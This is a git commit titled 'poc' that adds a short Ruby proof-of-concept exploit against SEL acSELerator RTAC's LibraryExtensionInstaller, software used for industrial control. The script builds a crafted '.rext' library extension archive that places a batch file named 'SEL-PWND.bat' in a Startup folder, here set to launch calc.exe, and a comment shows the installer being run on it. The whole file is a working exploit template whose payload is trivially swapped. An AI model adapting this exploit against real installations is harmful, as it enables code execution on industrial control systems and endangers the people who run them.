ed4fd5d1d8685646196d3e7c9942e2a33f4f520d
ceballosm <ceballosm@gmail.com>
2019-02-26 16:46:36 -0600

    poc

---
+++ SEL/acSELerator_RTAC/LibraryExtensionInstaller/library_extension.rb
@@ -0,0 +1,16 @@
+#!/usr/bin/env ruby
+# acSELerator RTAC Software 1.28.144.16958
+# acSELerator RTAC Software LibraryExtensionInstaller 1.28.144.16774 
+# acSELerator RTAC Software 1.26.143.15566
+# acSELerator RTAC Software LibraryExtensionInstaller 1.26.143.15558 
+#
+# C:\Program Files (x86)\SEL\AcSELerator\RTAC>LibraryExtensionInstaller.exe c:\Users\mc\Desktop\mc.rext
+require 'rex/zip'
+
+zip = Rex::Zip::Archive.new
+zip.add_file("Startup/cdc.xml")
+zip.add_file("Startup/cdc.xml.sig")
+zip.add_file("Startup/SEL-PWND.bat", "calc.exe")
+
+zip.save_to("mc.rext")
+
